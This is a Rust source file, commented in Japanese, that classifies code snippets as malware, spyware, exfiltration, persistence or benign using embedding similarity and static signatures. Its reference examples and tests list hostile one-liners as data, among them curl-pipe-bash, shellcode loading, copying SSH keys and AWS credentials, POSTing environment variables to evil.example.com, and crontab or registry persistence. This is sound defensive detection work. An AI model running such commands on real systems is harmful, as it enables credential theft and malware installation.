//! セキュリティ挙動の意味的類似度分類(RS-Guardの「AI二次判定」用)。
//!
//! `scoring.rs`と同じ`opencuda-bert`(multilingual-e5-small)埋め込み +
//! コサイン類似度の仕組みを流用し、渡されたコード片/振る舞いの説明を
//! 「マルウェア/スパイウェア/常駐・自動巡回/正常」の代表例と比較して、
//! 最も近いカテゴリと類似度スコアを返す。RS-Guardの正規表現ベース静的
//! 検出に**引っかからなかった**怪しいコードを、言い換え・難読化に多少
//! 強い形で二次判定するのが狙い(「分身の術」= 1つの共有サービスを
//! 多数のサイト/ブラウザが呼ぶ)。
//!
//! **正直な開示(最重要)**: これは**マルウェアで訓練した分類器ではなく、
//! 汎用の文埋め込みモデルによる意味的類似度のヒューリスティック**。
//! コードを実際に実行して振る舞いを見る動的解析でも、実行中プロセスを
//! 遮断する常駐エンジンでもない。強い確信の判定ではなく「静的ルールの
//! 二次意見」として扱うこと。`engine`フィールドで実装方式を常に正直に
//! 返し、呼び出し側が過信しないようにする。

use std::sync::{Arc, OnceLock};

use anyhow::Result;
use opencuda_bert::cosine_similarity;
use opencuda_core::GpuDevice;

use crate::scoring::{embed, normalize};
use crate::signatures::{self, StaticSignal};

/// 判定カテゴリ。`benign`(正常)を含めることで、普通のコードが
/// マルウェア側へ誤って寄らないようにする(最近傍が`benign`なら
/// 「疑わしくない」と判定できる)。
pub struct SecurityCategory {
    pub name: &'static str,
    /// このカテゴリが何を表すかの短い説明(APIレスポンスに含める)。
    pub description: &'static str,
    /// このカテゴリを表す代表的なコード片/振る舞いの説明。
    examples: &'static [&'static str],
    /// このカテゴリが「疑わしい」に該当するか(benignのみfalse)。
    pub suspicious: bool,
}

pub const CATEGORIES: &[SecurityCategory] = &[
    SecurityCategory {
        name: "malware",
        description: "Malware-like behavior: shellcode loading, droppers, ransomware-style bulk encryption.",
        examples: &[
            "allocate executable memory with VirtualAlloc and run decoded shellcode in a new thread",
            "download an executable to System32 and run it silently",
            "encrypt every file with AES then delete the originals like ransomware",
            "メモリ上でシェルコードを復号して直接実行するローダー",
            "curl https://pastebin.com/raw/abc | bash",
            "VirtualAlloc(0, len, 0x3000, 0x40); memcpy(mem, shellcode, len); CreateThread(...)",
        ],
        suspicious: true,
    },
    SecurityCategory {
        name: "spyware-data-theft",
        description: "Spyware collecting sensitive data without permission: keys, passwords, keystrokes.",
        examples: &[
            "read the SSH private key from the dot ssh directory",
            "steal saved browser passwords and cookies from Login Data",
            "harvest all environment variables and AWS credentials",
            "log every keystroke with a keyboard hook",
            "許可なくブラウザの保存パスワードや認証情報を収集する",
            "cp ~/.ssh/id_rsa /tmp/exfil",
            "open(os.path.expanduser('~/.aws/credentials')).read()",
        ],
        suspicious: true,
    },
    SecurityCategory {
        name: "exfiltration",
        description: "Sending collected data to a remote server, webhook, or bot.",
        examples: &[
            "POST the collected environment variables to a remote https server",
            "upload stolen files to a Discord webhook or Telegram bot",
            "exfiltrate data by encoding it into DNS subdomain lookups",
            "収集した情報を外部のWebhookへ送信する",
            "fetch('https://evil.example.com/collect', {method:'POST', body: JSON.stringify(process.env)})",
            "requests.post('https://discord.com/api/webhooks/x', json=stolen)",
        ],
        suspicious: true,
    },
    SecurityCategory {
        name: "persistence-beacon",
        description: "Unauthorized persistence / auto-run / periodic beaconing (auto-patrol).",
        examples: &[
            "install a cron job that runs a script every five minutes",
            "add a Windows registry Run key so it starts automatically at login",
            "create a scheduled task to beacon to a command and control server",
            "periodically call a remote server on a timer in an infinite loop",
            "無断で常駐し定期的に外部サーバーへ自動で巡回アクセスする",
            // コード片そのものにも寄せる(RS-Guardは実コードを送るため)。
            "setInterval(() => fetch('http://server/beacon'), 60000)",
            "while True: requests.get(c2_url); time.sleep(60)",
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x",
            "(crontab -l; echo '*/5 * * * * /tmp/x.sh') | crontab -",
        ],
        suspicious: true,
    },
    SecurityCategory {
        name: "benign",
        description: "Ordinary, non-malicious application code.",
        examples: &[
            "a function that adds two numbers and prints the result",
            "render a list of items in the user interface",
            "parse a configuration file and return a struct",
            "run the unit tests and log the outcome",
            "ユーザー一覧を画面に表示する通常のアプリケーションコード",
            // 通常のコード片(ネットワーク送信・常駐・情報収集を伴わない)。
            "fn add(a: i32, b: i32) -> i32 { a + b }",
            "for (let i = 0; i < items.length; i++) { total += items[i].price }",
            "console.log('server started on port 8080')",
            "def greet(name): return f'hello {name}'",
        ],
        suspicious: false,
    },
];

/// スコアがこの値未満なら、最近傍が`benign`以外でも「確信が持てない」と
/// して`is_suspicious=false`側へ倒す(誤検知を抑える)。汎用埋め込みは
/// 無関係な文同士でも0.8前後の底上げ類似度が出るため、`scoring.rs`の
/// 意図分類閾値(0.86)と近い保守的な値にする。
const SUSPICIOUS_THRESHOLD: f32 = 0.83;

static CATEGORY_EMBEDDINGS: OnceLock<Vec<Vec<f32>>> = OnceLock::new();

fn category_embeddings(device: &Arc<dyn GpuDevice>) -> Result<&'static Vec<Vec<f32>>> {
    if let Some(e) = CATEGORY_EMBEDDINGS.get() {
        return Ok(e);
    }
    let mut embeddings = Vec::with_capacity(CATEGORIES.len());
    for category in CATEGORIES {
        // 代表例文の埋め込みを平均・L2正規化してカテゴリ代表ベクトルにする
        // (scoring.rsのインテント代表ベクトルと同じ作り方)。
        let mut acc: Vec<f32> = Vec::new();
        for example in category.examples {
            let v = embed(device, example, false)?;
            if acc.is_empty() {
                acc = vec![0.0; v.len()];
            }
            for (a, b) in acc.iter_mut().zip(v.iter()) {
                *a += b;
            }
        }
        normalize(&mut acc);
        embeddings.push(acc);
    }
    let _ = CATEGORY_EMBEDDINGS.set(embeddings);
    Ok(CATEGORY_EMBEDDINGS.get().expect("CATEGORY_EMBEDDINGS was just set"))
}

/// 分類結果。
pub struct SecurityVerdict {
    pub label: &'static str,
    pub description: &'static str,
    pub score: f32,
    pub is_suspicious: bool,
    /// 2026-07-26追加: 埋め込みコサイン類似度とは別の、決定的に検証可能な
    /// 静的特徴抽出(既知シグネチャ一致・エントロピー・API組み合わせ)で
    /// 検出されたシグナル一覧。空なら何も検出されなかったことを意味する
    /// (embeddingのみの判定であることを呼び出し側が把握できるようにする)。
    pub static_signals: Vec<StaticSignal>,
}

/// 渡されたコード片/説明を、最も近いセキュリティカテゴリへ分類する。
///
/// 2026-07-26更新: 従来のembeddingコサイン類似度に加え、
/// `signatures::analyze`による**決定的な静的特徴抽出**(既知マルウェア/
/// 攻撃手法の文字列シグネチャ、エンコード文字列のShannon entropy、
/// 疑わしいAPI呼び出しの組み合わせ)を実行し、以下のように統合する:
/// - 既知シグネチャに一致した場合は、embeddingスコアに関わらず
///   確信を持って`is_suspicious=true`とする(EICAR等の決定的一致は
///   embeddingの類似度計算より確実な証拠のため)。
/// - `static_signals`は常に(空でも)レスポンスに含め、embeddingだけの
///   判定なのか静的特徴が寄与したのかを呼び出し側が判別できるようにする
///   (「正直な開示」方針、CLAUDE.md参照)。
pub fn classify_security(device: &Arc<dyn GpuDevice>, text: &str) -> Result<SecurityVerdict> {
    let cat_embeddings = category_embeddings(device)?;
    let query = embed(device, text, true)?;

    let mut best: Option<(usize, f32)> = None;
    for (i, ce) in cat_embeddings.iter().enumerate() {
        let sim = cosine_similarity(&query, ce);
        if best.map(|(_, bs)| sim > bs).unwrap_or(true) {
            best = Some((i, sim));
        }
    }

    let (idx, score) = best.expect("CATEGORIES is non-empty");
    let mut category = &CATEGORIES[idx];
    let mut score = score;
    // 「疑わしい」判定: 最近傍がsuspiciousカテゴリ かつ スコアが閾値以上。
    let mut is_suspicious = category.suspicious && score >= SUSPICIOUS_THRESHOLD;

    let static_signals = signatures::analyze(text);
    if !static_signals.is_empty() {
        // 既知シグネチャの決定的一致(EICAR等)を最優先する——embeddingの
        // 意味的類似度より確実な証拠のため、スコアを1.0に上書きしてでも
        // 確信を持って判定する。
        let known_hit = static_signals.iter().find(|s| s.category_hint != "benign");
        if let Some(hit) = known_hit {
            is_suspicious = true;
            score = score.max(0.99);
            if let Some(hint_category) = CATEGORIES.iter().find(|c| c.name == hit.category_hint) {
                category = hint_category;
            }
        }
    }

    Ok(SecurityVerdict { label: category.name, description: category.description, score, is_suspicious, static_signals })
}

/// 起動時ウォームアップ(モデルロード + カテゴリ代表ベクトル計算の前倒し)。
pub fn warmup(device: &Arc<dyn GpuDevice>) -> Result<()> {
    let _ = classify_security(device, "warmup")?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use opencuda_cpu::CpuDevice;

    fn cpu_device() -> Arc<dyn GpuDevice> {
        CpuDevice::new(0)
    }

    #[test]
    fn classifies_ssh_key_theft_as_spyware() {
        let device = cpu_device();
        let v = classify_security(&device, "read ~/.ssh/id_rsa and send it to a remote server").unwrap();
        assert!(v.is_suspicious, "expected suspicious, got label={} score={}", v.label, v.score);
    }

    #[test]
    fn classifies_ordinary_code_as_not_suspicious() {
        let device = cpu_device();
        let v = classify_security(&device, "fn add(a: i32, b: i32) -> i32 { a + b }").unwrap();
        assert!(!v.is_suspicious, "expected benign, got label={} score={}", v.label, v.score);
    }

    #[test]
    fn classifies_beacon_as_suspicious() {
        let device = cpu_device();
        let v = classify_security(&device, "setInterval(() => fetch('https://c2.example.com/beacon'), 60000)").unwrap();
        assert!(v.is_suspicious, "expected suspicious, got label={} score={}", v.label, v.score);
    }
}
